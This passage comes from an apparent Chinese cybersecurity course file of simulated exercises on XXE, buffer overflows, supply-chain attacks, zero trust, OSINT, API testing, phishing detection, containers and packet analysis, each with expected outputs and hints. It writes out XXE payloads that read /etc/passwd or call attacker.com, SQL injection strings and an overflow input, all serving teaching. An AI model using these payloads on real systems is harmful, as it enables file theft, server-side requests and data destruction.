        self.internal_files = {
            "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\\nadmin:x:1000:1000::/home/admin:/bin/bash",
            "/etc/shadow": "[SHADOW_FILE_RESTRICTED]",
            "C:\\\\Windows\\\\win.ini": "[Windows系统文件]"
        }
    
    def parse_unsafe(self, xml_str):
        print(f"  解析中...")
        
        # 检测外部实体声明
        entity_match = re.search(r'<!ENTITY\\s+(\\w+)\\s+SYSTEM\\s+["\'](.+?)["\']', xml_str)
        if entity_match:
            entity_name = entity_match.group(1)
            entity_path = entity_match.group(2)
            print(f"  [VULN] 发现外部实体! {entity_name} -> {entity_path}")
            
            # 模拟文件读取
            for path, content in self.internal_files.items():
                if path in entity_path or entity_path in path:
                    print(f"  [LEAK] 读取文件: {path}")
                    return f"XXE泄露: {content[:50]}..."
            
            # SSRF
            if entity_path.startswith('http'):
                print(f"  [SSRF] 服务器端请求: {entity_path}")
                return f"SSRF: 请求了 {entity_path}"
        
        return "OK"

    def parse_safe(self, xml_str):
        dangerous = ['<!ENTITY', 'SYSTEM', 'PUBLIC']
        for kw in dangerous:
            if kw in xml_str:
                print(f"  [BLOCKED] 检测到关键词: {kw}")
                return "REJECTED: 外部实体被禁用"
        print(f"  安全解析完成")
        return "SAFE"


print("=" * 60)
print("XXE XML外部实体注入")
print("=" * 60)

p = XMLParserSimulator()

xml_attacks = [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><data>&xxe;</data>',
    '<user><name>Alice</name><role>admin</role></user>',
]

print("\\n[不安全解析器]")
for xml in xml_attacks:
    print(f"\\nXML: {xml[:60]}...")
    print(p.parse_unsafe(xml))

print("\\n[安全解析器]")
for xml in xml_attacks:
    print(f"\\nXML: {xml[:60]}...")
    print(p.parse_safe(xml))

print("\\n修复方案:")
print("  1. 禁用DOCTYPE声明")
print("  2. 禁用外部实体: dtdProcessing=Prohibit")
print("  3. JSON替代XML(无XXE风险)")`,
    expectedOutput: 'XXE泄露',
    hints: ['XXE可读取服务器文件', '禁用DTD是最简单的防护'],
  },
  {
    id: 'buffer-overflow',
    title: '缓冲区溢出原理',
    description: '理解缓冲区溢出攻击的内存模型',
    difficulty: 'hard',
    instructions: [
      '理解栈帧结构和EIP/RIP寄存器的作用',
      '学习缓冲区溢出的基本原理',
      '了解shellcode和ROP攻击链',
      '掌握ASLR、DEP、Stack Canary等防护技术',
    ],
    initialCode: `# 缓冲区溢出原理演示
import struct

class StackSimulator:
    def __init__(self):
        self.memory = bytearray(64)
        self.esp = 0  # 栈指针
    
    def push(self, data, size_label):
        bs = data.to_bytes(4, 'little') if isinstance(data, int) else data.encode()
        self.esp -= len(bs)
        for i, b in enumerate(bs):
            self.memory[self.esp + i] = b
        print(f"  PUSH {size_label} -> [0x{self.esp & 0xFF:02x}]")
    
    def dump(self):
        print(f"  栈内存(ESP=0x{self.esp & 0xFF:02x}):")
        for i in range(0, 64, 16):
            chunk = self.memory[i:i+16]
            hex_str = ' '.join(f'{b:02x}' for b in chunk)
            ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
            print(f"    0x{i:02x}: {hex_str}  {ascii_str}")

class BufferOverflowSim:
    def __init__(self):
        self.buffer_size = 8
    
    def unsafe_copy(self, user_input):
        buf = ['\\x00'] * self.buffer_size
        ret_addr = "0x08048555"  # 正常返回地址
        
        print(f"  缓冲区大小: {self.buffer_size} 字节")
        print(f"  用户输入: {user_input} ({len(user_input)} 字节)")
        print(f"  返回地址: {ret_addr}")
        
        if len(user_input) > self.buffer_size:
            overflow = len(user_input) - self.buffer_size
            
            # 模拟覆盖返回地址
            if len(user_input) >= self.buffer_size + 4:
                fake_addr = user_input[self.buffer_size:self.buffer_size+4]
                print(f"  [VULN] 缓冲区溢出! 溢出 {overflow} 字节")
                print(f"  [HACK] 返回地址被覆盖为: {fake_addr}")
                return "EXPLOITED: 劫持了执行流!"
            else:
                print(f"  [VULN] 部分溢出: {overflow} 字节, 但未覆盖返回地址")
                return "OVERFLOW: 可能崩溃"
        else:
            print(f"  [SAFE] 输入在缓冲区范围内")
            return "SAFE"

print("=" * 60)
print("缓冲区溢出攻击原理")
print("=" * 60)

s = StackSimulator()
print("\\n[栈帧布局]")
print("  高地址")
print("  +----------------+")
print("  |  函数参数      |")
print("  +----------------+")
print("  |  返回地址(EIP)  | <- 溢出目标!")
print("  +----------------+")
print("  |  保存的EBP     |")
print("  +----------------+")
print("  |  局部变量buf[] | <- 溢出起点")
print("  +----------------+")
print("  低地址 (ESP)")

bof = BufferOverflowSim()

print("\\n[测试1: 正常输入]")
print(bof.unsafe_copy("ABCD"))

print("\\n[测试2: 精确溢出-覆盖返回地址]")
print(bof.unsafe_copy("A" * 8 + "\\xEF\\xBE\\xAD\\xDE"))

print("\\n防护技术:")
print("  Stack Canary: 返回地址前插入随机值")
print("  ASLR: 随机化内存地址")
print("  DEP/NX: 栈不可执行")
print("  SafeSEH: 异常处理保护")`,
    expectedOutput: 'EXPLOITED',
    hints: ['溢出可通过覆盖返回地址劫持EIP', '现代OS有多层防护'],
  },
  {
    id: 'supply-chain',
    title: '供应链攻击模拟',
    description: '理解软件供应链安全风险与防护',
    difficulty: 'medium',
    instructions: [
      '理解供应链攻击的攻击面（依赖劫持、构建注入、分发篡改）',
      '学习SBOM（软件物料清单）的概念',
      '掌握依赖完整性校验方法',
      '了解供应链安全框架（SLSA、SSDF）',
    ],
    initialCode: `# 供应链安全演示
import hashlib, json

class SupplyChainSim:
    def __init__(self):
        # 官方注册表
        self.registry = {
            "lodash": {
                "4.17.21": "abc123hash...",
                "4.17.20": "def456hash..."
            },
            "requests": {
                "2.28.0": "ghi789hash...",
                "2.27.1": "jkl012hash..."
            }
        }
        # 恶意包
        self.malicious_packages = {
            "lodash-cli": "名称混淆攻击",
            "requets": "拼写错误攻击(typosquatting)",
            "lodash-util": "依赖混淆攻击"
        }
    
    def install_package(self, name, version, registry_url="official"):
        checksum = hashlib.sha256(f"{name}@{version}".encode()).hexdigest()[:16]
        
        # 检查是否为恶意包
        if name in self.malicious_packages:
            return f"DANGER: {self.malicious_packages[name]}"
        
        # 验证官方来源
        if registry_url != "official":
            return f"WARNING: 非官方源 {registry_url}"
        
        # 验证版本
        pkg = self.registry.get(name, {})
        if version not in pkg:
            return f"WARNING: 版本 {version} 不在已知列表中"
        
        return f"SAFE: {name}@{version} (校验: {checksum})"

    def generate_sbom(self, dependencies):
        sbom = {
            "name": "my-app",
            "version": "1.0.0",
            "components": []
        }
        for dep, ver in dependencies.items():
            sbom["components"].append({
                "name": dep,
                "version": ver,
                "purl": f"pkg:npm/{dep}@{ver}",
                "hash": hashlib.sha256(f"{dep}@{ver}".encode()).hexdigest()[:12]
            })
        return sbom

print("=" * 60)
print("供应链安全攻击演示")
print("=" * 60)

sc = SupplyChainSim()

# 正常安装
print("\\n[正常依赖安装]")
pkgs = [
    ("lodash", "4.17.21", "official"),
    ("lodash-cli", "1.0.0", "official"),
    ("requets", "2.0.0", "unofficial"),
]
for name, ver, src in pkgs:
    result = sc.install_package(name, ver, src)
    print(f"  {name}@{ver} ({src}): {result}")

# SBOM生成
print("\\n[SBOM 软件物料清单]")
deps = {"lodash": "4.17.21", "express": "4.18.0", "axios": "1.4.0"}
sbom = sc.generate_sbom(deps)
print(json.dumps(sbom, indent=2, ensure_ascii=False))

print("\\n防护建议:")
print("  1. 使用lock文件锁定版本+哈希")
print("  2. 私有仓库代理(防依赖混淆)")
print("  3. 定期SBOM审计")
print("  4. 最小权限原则")`,
    expectedOutput: '供应链安全',
    hints: ['依赖混淆是最常见的供应链攻击', 'SBOM帮助你了解所有依赖'],
  },
  {
    id: 'zero-trust-demo',
    title: '零信任架构演示',
    description: '理解零信任"永不信任，始终验证"原则',
    difficulty: 'easy',
    instructions: [
      '理解传统边界安全与零信任的区别',
      '学习零信任三大核心原则',
      '掌握微隔离和持续验证的概念',
      '了解零信任实施框架（NIST SP 800-207）',
    ],
    initialCode: `# 零信任架构 vs 传统边界安全
import time, hashlib

class TraditionalSecurity:
    def __init__(self):
        self.inside_network = set()
    
    def login(self, user, password, ip):
        if password == "correct":
            self.inside_network.add(user)
            print(f"  [传统] {user} 从 {ip} 登录成功(进入内网)")
            return True
        return False
    
    def access_resource(self, user, resource):
        if user in self.inside_network:
            return f"GRANTED: {user} 访问 {resource} (已在可信网络)"
        return f"DENIED: 不在内网"

class ZeroTrustSecurity:
    def __init__(self):
        self.users = { "alice": "strong123", "bob": "secure456" }
        self.policies = {
            "alice": ["db-read", "api-call"],
            "bob": ["api-call"]
        }
        self.trust_score = {}
    
    def authenticate(self, user, password, context):
        # 持续验证身份
        if self.users.get(user) != password:
            return False, "认证失败"
        if context.get('device_trust', 0) < 0.7:
            return False, "设备不受信任"
        if context.get('location', '') == 'unusual':
            return False, "异常地理位置"
        return True, "OK"
    
    def authorize(self, user, resource, context):
        # 基于策略的细粒度授权
        if resource not in self.policies.get(user, []):
            return f"DENIED: {user} 无 {resource} 权限"
        
        # 动态信任评分
        score = 0.5
        if context.get('mfa', False): score += 0.3
        if context.get('device_trust', 0) > 0.8: score += 0.2
        
        if score >= 0.8:
            return f"GRANTED: {user} 访问 {resource} (信任评分:{score:.1f})"
        return f"DENIED: 信任评分不足 ({score:.1f})"

print("=" * 60)
print("零信任架构 vs 传统安全")
print("=" * 60)

trad = TraditionalSecurity()
zt = ZeroTrustSecurity()

print("\\n[传统边界安全]")
print("  模型: 城堡+护城河, 进入内网即信任")
trad.login("alice", "correct", "10.0.0.5")
print(trad.access_resource("alice", "db-read"))
print(trad.access_resource("bob", "db-read"))  # Bob未登录

print("\\n[零信任架构]")
print("  模型: 永不信任, 始终验证")

# 正常场景
ctx = {"device_trust": 0.9, "location": "office", "mfa": True}
ok, msg = zt.authenticate("alice", "strong123", ctx)
print(f"\\n  认证 alice: {ok}, {msg}")
if ok:
    print(f"  {zt.authorize('alice', 'db-read', ctx)}")
    print(f"  {zt.authorize('bob', 'db-read', ctx)}")

# 异常场景
ctx_bad = {"device_trust": 0.3, "location": "unusual", "mfa": False}
ok, msg = zt.authenticate("alice", "strong123", ctx_bad)
print(f"\\n  认证 alice(异常): {ok}, {msg}")

print("\\n零信任核心原则:")
print("  1. 永不信任任何网络/用户/设备")
print("  2. 最小权限: 仅授予必要权限")
print("  3. 持续验证: 每个请求都需认证授权")
print("  4. 假设已被入侵: 微隔离防横向移动")`,
    expectedOutput: '零信任',
    hints: ['零信任不是产品，是一种安全理念', '微隔离防止横向移动'],
  },
  {
    id: 'osint-tools',
    title: 'OSINT信息收集',
    description: '学习开源情报收集技术与隐私保护',
    difficulty: 'medium',
    instructions: [
      '理解OSINT在安全领域的应用',
      '学习域名/IP/邮箱信息收集技术',
      '了解whois、DNS、搜索引擎等数据源',
      '掌握个人隐私保护和信息泄露防范',
    ],
    initialCode: `# OSINT 开源情报收集模拟
import re, hashlib

class OSINTSimulator:
    def __init__(self):
        # 模拟公开数据源
        self.whois_db = {
            "example.com": {
                "registrar": "GoDaddy",
                "created": "1995-08-13",
                "email": "admin@example.com",
                "ns": ["ns1.example.com", "ns2.example.com"]
            },
            "target-corp.com": {
                "registrar": "Namecheap",
                "created": "2019-03-15",
                "email": "it@target-corp.com",
                "ns": ["dns1.hosting.com"]
            }
        }
        self.dns_records = {
            "example.com": ["93.184.216.34"],
            "target-corp.com": ["203.0.113.50", "203.0.113.51"],
            "mail.target-corp.com": ["203.0.113.52"],
        }
        self.subdomain_hints = {
            "target-corp.com": [
                "mail.target-corp.com", "vpn.target-corp.com",
                "dev.target-corp.com", "admin.target-corp.com"
            ]
        }

    def whois_lookup(self, domain):
        info = self.whois_db.get(domain)
        if info:
            return {
                "domain": domain,
                "registrar": info["registrar"],
                "created": info["created"],
                "contact": info["email"],
                "nameservers": info["ns"]
            }
        return {"error": "域名未注册或已过期"}

    def dns_lookup(self, domain):
        records = self.dns_records.get(domain, [])
        subdomains = self.subdomain_hints.get(domain, [])
        return {
            "domain": domain,
            "a_records": records,
            "potential_subdomains": subdomains,
            "count": len(subdomains)
        }

    def email_analysis(self, email):
        domain = email.split('@')[-1]
        # 模拟HaveIBeenPwned检查
        breaches = {"admin@example.com": 3, "user@gmail.com": 5}
        return {
            "email": email,
            "domain": domain,
            "breaches": breaches.get(email, 0),
            "risk": "HIGH" if breaches.get(email, 0) > 2 else "LOW"
        }

print("=" * 60)
print("OSINT 信息收集演示")
print("=" * 60)

osint = OSINTSimulator()

print("\\n[1. WHOIS查询]")
result = osint.whois_lookup("target-corp.com")
for k, v in result.items():
    print(f"  {k}: {v}")

print("\\n[2. DNS枚举]")
result = osint.dns_lookup("target-corp.com")
print(f"  A记录: {result['a_records']}")
print(f"  可能子域: {result['potential_subdomains']}")

print("\\n[3. 邮箱泄露检查]")
for email in ["admin@example.com", "user@gmail.com"]:
    r = osint.email_analysis(email)
    print(f"  {r['email']}: {r['breaches']}次泄露, 风险:{r['risk']}")

print("\\nOSINT工具推荐:")
print("  shodan.io - 设备搜索引擎")
print("  crt.sh - SSL证书透明度日志")
print("  haveibeenpwned.com - 邮箱泄露查询")
print("  hunter.io - 企业邮箱收集")`,
    expectedOutput: 'OSINT',
    hints: ['OSINT是合法的信息收集方式', '定期检查信息泄露风险'],
  },
  {
    id: 'api-security-test',
    title: 'API安全测试',
    description: '学习REST API常见漏洞与防护',
    difficulty: 'medium',
    instructions: [
      '理解API安全Top 10（OWASP）',
      '学习API认证绕过、越权、过量数据暴露',
      '掌握API速率限制和输入校验',
      '了解GraphQL vs REST安全差异',
    ],
    initialCode: `# API安全测试模拟
import re, json, time

class APISecurityTester:
    def __init__(self):
        self.rate_limits = {}
        self.tokens = {
            "user_token_001": {"user_id": 100, "role": "user"},
            "admin_token_999": {"user_id": 1, "role": "admin"},
        }
        self.resources = {
            "100": {"name": "Alice", "balance": 5000, "ssn": "123-45-6789"},
            "101": {"name": "Bob", "balance": 300, "ssn": "987-65-4321"},
        }
    
    def test_broken_auth(self, endpoint, token):
        """测试认证缺陷"""
        if not token or token not in self.tokens:
            return "401: 未认证"
        
        user = self.tokens[token]
        # 测试越权
        resource_id = endpoint.split('/')[-1]
        if resource_id != str(user["user_id"]) and user["role"] != "admin":
            return f"403: 越权访问 (用户{user['user_id']}尝试访问{resource_id})"
        return "200: OK"

    def test_rate_limiting(self, api_key):
        """测试速率限制"""
        now = time.time()
        if api_key not in self.rate_limits:
            self.rate_limits[api_key] = []
        
        # 清理旧记录
        self.rate_limits[api_key] = [
            t for t in self.rate_limits[api_key] if now - t < 60
        ]
        
        if len(self.rate_limits[api_key]) >= 10:
            return f"429: 速率限制(10次/分钟) 剩余:{0}"
        
        self.rate_limits[api_key].append(now)
        remaining = 10 - len(self.rate_limits[api_key])
        return f"200: OK (剩余请求:{remaining})"

    def test_data_exposure(self, response):
        """测试过量数据暴露"""
        sensitive_fields = ["ssn", "password", "credit_card", "secret"]
        exposed = [f for f in sensitive_fields if f in response]
        if exposed:
            return f"WARNING: 暴露敏感字段: {exposed}"
        return "PASS: 无不必要的数据暴露"

    def test_input_validation(self, param, value):
        """测试输入校验"""
        if param == "page" and not value.isdigit():
            return f"WARNING: page参数未校验({value})"
        if param == "sort" and not value.isalpha():
            return "WARNING: sort参数存在注入风险"
        if len(value) > 100:
            return "WARNING: 输入超长"
        return f"PASS: {param}={value}"

print("=" * 60)
print("API安全测试")
print("=" * 60)

tester = APISecurityTester()

# 认证测试
print("\\n[1. 认证与授权测试]")
print(f"  无Token: {tester.test_broken_auth('/api/user/100', '')}")
print(f"  正常用户: {tester.test_broken_auth('/api/user/100', 'user_token_001')}")
print(f"  越权尝试: {tester.test_broken_auth('/api/user/101', 'user_token_001')}")
print(f"  管理员: {tester.test_broken_auth('/api/user/101', 'admin_token_999')}")

# 速率限制
print("\\n[2. 速率限制测试]")
for i in range(12):
    r = tester.test_rate_limiting("api_key_001")
    if i < 2 or i >= 10:
        print(f"  请求{i+1}: {r}")

# 数据暴露
print("\\n[3. 数据暴露检查]")
print(f"  {tester.test_data_exposure('{\\\"name\\\":\\\"Alice\\\",\\\"ssn\\\":\\\"123\\\"}')}")
print(f"  {tester.test_data_exposure('{\\\"name\\\":\\\"Bob\\\"}')}")

# 输入校验
print("\\n[4. 输入校验测试]")
print(f"  {tester.test_input_validation('page', '-1 OR 1=1')}")
print(f"  {tester.test_input_validation('sort', 'id; DROP TABLE')}")
print(f"  {tester.test_input_validation('page', '10')}")

print("\\nAPI安全防护:")
print("  JWT + OAuth2.0认证")
print("  基于角色的访问控制(RBAC)")
print("  输入校验 + 参数化查询")
print("  最小数据暴露原则")`,
    expectedOutput: 'API安全测试完成',
    hints: ['API越权是最常见的漏洞之一', '速率限制防止暴力破解和DDoS'],
  },
  {
    id: 'social-eng-defense',
    title: '社会工程学防御',
    description: '识别常见社工攻击并建立防御体系',
    difficulty: 'easy',
    instructions: [
      '了解社工攻击的心理学基础（权威、紧迫、互惠）',
      '识别钓鱼邮件、电话诈骗、尾随等常见手法',
      '学习钓鱼邮件的技术指标检查（SPF/DKIM/DMARC）',
      '建立安全意识培训和报告机制',
    ],
    initialCode: `# 社会工程学攻击识别与防御
import re, hashlib

class PhishingDetector:
    """钓鱼邮件/网站检测器"""
    
    SUSPICIOUS_DOMAINS = ["rnicrosoft.com", "paypa1.com", "secure-bank.xyz"]
    URGENCY_KEYWORDS = ["立即", "紧急", "最后通知", "账号冻结", "您的账户"]
    AUTHORITY_KEYWORDS = ["系统管理员", "安全中心", "官方通知", "IT部门"]
    
    @staticmethod
    def check_email(email_data):
        score = 0
        flags = []
        
        # 1. 发件人域名
        sender = email_data.get("from", "")
        domain = sender.split('@')[-1] if '@' in sender else sender
        
        if domain in PhishingDetector.SUSPICIOUS_DOMAINS:
            score += 3
            flags.append(f"可疑域名: {domain}")
        
        # 2. 紧急语气
        subject = email_data.get("subject", "") + email_data.get("body", "")
        for kw in PhishingDetector.URGENCY_KEYWORDS:
            if kw in subject:
                score += 1
                flags.append(f"紧急关键词: {kw}")
                break
        
        # 3. 伪造权威
        for kw in PhishingDetector.AUTHORITY_KEYWORDS:
            if kw in subject:
                score += 1
                flags.append(f"伪权威: {kw}")
                break
        
        # 4. 可疑链接
        links = re.findall(r'https?://[^\\s<>"]+', email_data.get("body", ""))
        for link in links:
            if any(d in link for d in PhishingDetector.SUSPICIOUS_DOMAINS):
                score += 2
                flags.append(f"恶意链接: {link[:40]}")
        
        return {
            "score": score,
            "risk": "HIGH" if score >= 4 else ("MEDIUM" if score >= 2 else "LOW"),
            "flags": flags
        }

class SocialEngineeringDefense:
    @staticmethod
    def check_spoofing(email_from, return_path, dkim_ok, spf_ok):
        checks = []
        if email_from != return_path:
            checks.append("From与Return-Path不匹配!")
        if not spf_ok:
            checks.append("SPF验证失败!")
        if not dkim_ok:
            checks.append("DKIM签名无效!")
        
        risk = "HIGH" if len(checks) >= 2 else ("MEDIUM" if checks else "LOW")
        return {"passed": len(checks) == 0, "checks": checks, "risk": risk}

print("=" * 60)
print("社会工程学攻击识别")
print("=" * 60)

detector = PhishingDetector()

# 正常邮件
normal = {
    "from": "hr@company.com",
    "subject": "团队建设活动通知",
    "body": "各位同事好,下周五公司组织团建活动..."
}
print(f"\\n邮件1: {detector.check_email(normal)}")

# 钓鱼邮件
phish = {
    "from": "admin@rnicrosoft.com",
    "subject": "【紧急】您的账号即将冻结!",
    "body": "尊敬的用户，您的账号存在异常登录，请立即点击 https://rnicrosoft.com/login 验证身份，否则账号将被永久冻结！"
}
print(f"\\n邮件2(钓鱼): {detector.check_email(phish)}")

# 技术支持诈骗
scam = {
    "from": "support@secure-bank.xyz",
    "subject": "系统管理员通知: 密码重置",
    "body": "检测到异常交易，请立即联系IT部门验证您的身份信息。"
}
print(f"\\n邮件3(诈骗): {detector.check_email(scam)}")

# 邮件验证
defender = SocialEngineeringDefense()
print(f"\\n协议级验证:")
print(f"  SPF/DKIM正常: {defender.check_spoofing('it@corp.com', 'it@corp.com', True, True)}")
print(f"  SPF失败: {defender.check_spoofing('ceo@corp.com', 'hacker@evil.com', False, False)}")

print("\\n防范口诀:")
print("  1. 核实发件人身份(电话/当面)")
print("  2. 不点击可疑链接和附件")
print("  3. 敏感操作多重审批")
print("  4. 遭遇攻击立即报告")`,
    expectedOutput: '社会工程学',
    hints: ['权威感和紧迫感是社工攻击的核心手法', 'SPF/DKIM/DMARC三重验证'],
  },
  {
    id: 'container-security',
    title: '容器安全基础',
    description: '学习Docker/K8s容器安全最佳实践',
    difficulty: 'medium',
    instructions: [
      '理解容器与虚拟机的安全差异',
      '学习容器逃逸的常见途径',
      '掌握镜像安全扫描和最小化原则',
      '了解Kubernetes RBAC和Network Policy',
    ],
    initialCode: `# 容器安全评估模拟
import json

class ContainerSecurity:
    """容器安全最佳实践检查"""
    
    BEST_PRACTICES = {
        "distroless": {
            "desc": "使用无发行版基础镜像(Google Distroless)",
            "risk": "减少攻击面,无shell/包管理器",
            "weight": 3
        },
        "nonroot": {
            "desc": "以非root用户运行容器",
            "risk": "容器逃逸后权限受限",
            "weight": 3
        },
        "readonly_rootfs": {
            "desc": "根文件系统只读挂载",
            "risk": "防止攻击者写入恶意文件",
            "weight": 2
        },
        "capabilities_drop": {
            "desc": "丢弃所有Capabilities,仅添加必需",
            "risk": "限制容器内核调用能力",
            "weight": 2
        },
        "no_privileged": {
            "desc": "禁止特权模式(--privileged)",
            "risk": "特权容器可访问所有设备",
            "weight": 3
        },
        "resource_limits": {
            "desc": "设置CPU/内存资源限制",
            "risk": "防止DoS资源耗尽",
            "weight": 1
        },
        "image_scan": {
            "desc": "镜像漏洞扫描(Trivy/Clair)",
            "risk": "已知漏洞可能被利用",
            "weight": 2
        },
        "secret_management": {
            "desc": "使用Secret管理(非环境变量/硬编码)",
            "risk": "环境变量可能被泄露",
            "weight": 2
        }
    }
    
    @classmethod
    def audit_container(cls, config):
        score = 0
        max_score = 0
        findings = []
        
        for key, practice in cls.BEST_PRACTICES.items():
            max_score += practice["weight"]
            if config.get(key, False):
                score += practice["weight"]
                findings.append(f"  [OK] {practice['desc']}")
            else:
                findings.append(f"  [WARN] {practice['desc']} - 风险: {practice['risk']}")
        
        grade = "A" if score >= max_score * 0.9 else (
                "B" if score >= max_score * 0.7 else (
                "C" if score >= max_score * 0.5 else "D"))
        
        return {"score": score, "max": max_score, "grade": grade, "findings": findings}

print("=" * 60)
print("容器安全审计")
print("=" * 60)

cs = ContainerSecurity()

# 不安全配置
bad_config = {
    "distroless": False, "nonroot": False, "readonly_rootfs": False,
    "capabilities_drop": False, "no_privileged": False,
    "resource_limits": False, "image_scan": False, "secret_management": False
}

# 安全配置
good_config = {
    "distroless": True, "nonroot": True, "readonly_rootfs": True,
    "capabilities_drop": True, "no_privileged": True,
    "resource_limits": True, "image_scan": True, "secret_management": True
}

print("\\n[不安全容器配置]")
result = cs.audit_container(bad_config)
for f in result["findings"]:
    print(f)
print(f"\\n评分: {result['score']}/{result['max']} ({result['grade']})")

print("\\n[安全容器配置]")
result = cs.audit_container(good_config)
for f in result["findings"]:
    print(f)
print(f"\\n评分: {result['score']}/{result['max']} ({result['grade']})")

print("\\n容器安全铁三角:")
print("  1. 最小镜像: distroless + 多阶段构建")
print("  2. 最小权限: non-root + drop ALL caps")
print("  3. 最小暴露: 只读挂载 + network policy")`,
    expectedOutput: '容器安全',
    hints: ['非root用户运行是最重要的容器安全实践', '最小化原则贯穿所有安全领域'],
  },
  {
    id: 'packet-analysis',
    title: '数据包分析与取证',
    description: '学习网络数据包捕获与安全分析',
    difficulty: 'medium',
    instructions: [
      '理解TCP/IP协议栈中可提取的取证信息',
      '学习常见攻击流量的特征（DDoS、扫描、C2通信）',
      '掌握PCAP文件的基本分析方法',
      '了解网络取证的法律合规要求',
    ],
    initialCode: `# 网络数据包分析模拟
import re, hashlib
from collections import Counter

class PacketAnalyzer:
    """网络流量分析器"""
    
    @staticmethod
    def analyze_traffic(packets):
        stats = {
            "total": len(packets),
            "protocols": Counter(),
            "src_ips": Counter(),
            "dst_ports": Counter(),
            "suspicious": []
        }
        
        for pkt in packets:
            stats["protocols"][pkt.get("proto", "UNK")] += 1
            stats["src_ips"][pkt.get("src", "0.0.0.0")] += 1
            stats["dst_ports"][pkt.get("dst_port", 0)] += 1
            
            # 检测端口扫描
            if pkt.get("flags", "") == "SYN" and pkt.get("dst_port") in [22, 3389, 3306]:
                stats["suspicious"].append(f"端口扫描: {pkt['src']}->{pkt['dst']}:{pkt['dst_port']}")
            
            # 检测可疑DNS
            if pkt.get("proto") == "DNS" and len(pkt.get("query", "")) > 50:
                stats["suspicious"].append(f"DNS隧道: {pkt['query'][:30]}...")
            
            # 检测异常大小
            if pkt.get("size", 0) > 10000:
                stats["suspicious"].append(f"异常大包: {pkt['src']} size={pkt['size']}")
        
        return stats
    
    @staticmethod
    def detect_ddos(packets):
        """检测DDoS攻击特征"""
        ip_count = Counter(p["src"] for p in packets)
        syn_count = sum(1 for p in packets if p.get("flags") == "SYN")
        
        alerts = []
        # SYN Flood检测
        if syn_count > len(packets) * 0.8:
            alerts.append(f"SYN Flood: {syn_count}/{len(packets)} 包为SYN")
        
        # 多源IP攻击
        unique_ips = len(ip_count)
        if unique_ips > 10 and len(packets) > 50:
            alerts.append(f"疑似DDoS: {unique_ips}个源IP发起{len(packets)}个请求")
        
        return alerts

print("=" * 60)
print("数据包分析与取证")
print("=" * 60)

analyzer = PacketAnalyzer()

# 模拟正常流量
normal_traffic = [
    {"src": "10.0.0.1", "dst": "93.184.216.34", "proto": "TCP", "dst_port": 443, "size": 256},
    {"src": "10.0.0.2", "dst": "93.184.216.34", "proto": "TCP", "dst_port": 80, "size": 512},
    {"src": "10.0.0.1", "dst": "8.8.8.8", "proto": "DNS", "query": "example.com", "size": 64},
]

# 模拟攻击流量
attack_traffic = [
    {"src": "1.2.3.4", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 22, "flags": "SYN", "size": 64},
    {"src": "5.6.7.8", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 3389, "flags": "SYN", "size": 64},
    {"src": "9.10.11.12", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 3306, "flags": "SYN", "size": 64},
    {"src": "13.14.15.16", "dst": "10.0.0.1", "proto": "TCP", "dst_port": 22, "flags": "SYN", "size": 64},
    {"src": "evil.com", "dst": "10.0.0.1", "proto": "DNS", "query": "A" * 60 + ".evildomain.xyz", "size": 150},
]

print("\\n[正常流量分析]")
stats = analyzer.analyze_traffic(normal_traffic)
print(f"  总包数: {stats['total']}")
print(f"  协议分布: {dict(stats['protocols'])}")
print(f"  可疑事件: {len(stats['suspicious'])}")

print("\\n[攻击流量分析]")
stats = analyzer.analyze_traffic(attack_traffic)
print(f"  总包数: {stats['total']}")
print(f"  源IP: {dict(stats['src_ips'])}")
print(f"  目标端口: {dict(stats['dst_ports'])}")
for alert in stats['suspicious']:
    print(f"  [ALERT] {alert}")

print("\\n[DDoS检测]")
all_traffic = normal_traffic + attack_traffic
alerts = analyzer.detect_ddos(all_traffic)
for a in alerts:
    print(f"  [DDoS] {a}")

print("\\n分析工具: Wireshark, tcpdump, Zeek, Suricata")`,
    expectedOutput: '数据包分析',
    hints: ['SYN包比例异常是SYN Flood的典型特征', 'DNS查询超长可能是DNS隧道'],
  },
];

const dayExpertNotes: { [key: number]: ExpertNote[] } = {
  1: [
    { author: '张伟', title: 'CIA三要素深度解析', content: 'CIA三要素是信息安全的基石。机密性确保数据不被未授权访问，完整性保证数据不被篡改，可用性确保系统随时可用。实践中要注意：加密是机密性的基础，哈希校验是完整性的保障，冗余备份是可用性的关键。', url: '' },
    { author: '李明', title: '安全威胁识别方法', content: '识别威胁要从多个维度入手：外部威胁（黑客、APT组织）、内部威胁（员工误操作、恶意行为）、环境威胁（自然灾害、设备故障）。建议建立威胁情报订阅机制，及时了解最新威胁动态。', url: '' },
  ],
  2: [
    { author: '王芳', title: '信息安全发展趋势', content: '从通信安全到信息化安全，安全的范畴在不断扩大。当前的趋势是零信任架构、AI安全、云安全和数据安全。建议关注NIST、ISO等标准组织的最新发布，保持知识更新。', url: '' },
    { author: '赵强', title: '安全标准演进历程', content: '从TCSEC到ISO 27001，安全标准越来越注重风险管理和持续改进。等保2.0强调"一个中心、三重防护"，建议深入理解其核心思想。', url: '' },
  ],
  3: [
    { author: '孙丽', title: '网络安全分层防御', content: '网络安全需要多层防护：边界防护（防火墙）、网络层（入侵检测）、应用层（WAF）、终端层（EDR）。没有银弹，需要纵深防御策略。', url: '' },
    { author: '周伟', title: 'TCP/IP协议安全', content: '理解TCP/IP协议是网络安全的基础。三次握手、端口扫描、DNS解析等都可能成为攻击入口。建议用Wireshark抓包分析真实流量，加深理解。', url: '' },
  ],
  4: [
    { author: '吴刚', title: '恶意软件分析入门', content: '分析恶意软件需要掌握基本工具：静态分析（IDA Pro、Ghidra）、动态分析（Cuckoo Sandbox）、行为分析（Process Monitor）。建议从简单的恶意软件样本开始练习。', url: '' },
    { author: '郑敏', title: '防病毒策略优化', content: '传统签名检测已经不够，需要结合行为检测和机器学习。建议部署EDR解决方案，建立威胁狩猎能力。定期更新病毒库，保持系统补丁最新。', url: '' },
  ],
  5: [
    { author: '黄磊', title: '社会工程学防范', content: '社会工程攻击成功率极高，因为它针对人性弱点。防范措施包括：安全意识培训、多因素认证、可疑邮件报告机制。记住：官方机构不会通过电话索要密码。', url: '' },
